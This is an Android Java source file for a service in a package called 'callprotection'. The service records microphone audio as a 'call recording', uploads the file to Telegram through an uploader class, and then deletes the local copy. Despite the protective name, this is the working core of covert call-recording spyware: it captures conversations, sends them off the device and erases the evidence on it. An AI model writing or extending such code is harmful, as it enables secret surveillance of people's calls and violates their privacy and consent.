package com.daria.callprotection;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CallService extends Service {

    private static final String TAG = "CallService";
    private MediaRecorder recorder;
    private File audioFile;
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private Handler mainHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(getMainLooper());
        Log.d(TAG, "Service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecording();
        return START_NOT_STICKY;
    }

    private void startRecording() {
        try {
            File dir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "records");
            if (!dir.exists()) {
                if (!dir.mkdirs()) {
                    Log.e(TAG, "Failed to create directory for recordings");
                    stopSelf();
                    return;
                }
            }
            audioFile = new File(dir, "call_" + System.currentTimeMillis() + ".m4a");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            Log.d(TAG, "Recording started: " + audioFile.getAbsolutePath());

        } catch (IOException e) {
            Log.e(TAG, "Error starting recording", e);
            stopSelf();
        } catch (SecurityException se) {
            Log.e(TAG, "Permission denied for recording", se);
            stopSelf();
        }
    }

    private void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                Log.d(TAG, "Recording stopped");
                sendRecordingToTelegram();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording", e);
        }
    }

    private void sendRecordingToTelegram() {
        if (audioFile == null || !audioFile.exists()) {
            Log.e(TAG, "No audio file to send");
            return;
        }

        executorService.execute(() -> {
            try {
                TelegramUploader uploader = new TelegramUploader(getApplicationContext());
                boolean success = uploader.sendFile(audioFile, "Call Recording");

                mainHandler.post(() -> {
                    if (success) {
                        Log.d(TAG, "Recording sent successfully");
                        boolean deleted = audioFile.delete();
                        if (!deleted) {
                            Log.w(TAG, "Failed to delete local file after sending");
                        }
                    } else {
                        Log.e(TAG, "Failed to send recording");
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "Error sending recording", e);
            }
        });
    }

    @Override
    public void onDestroy() {
        stopRecording();
        executorService.shutdown();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
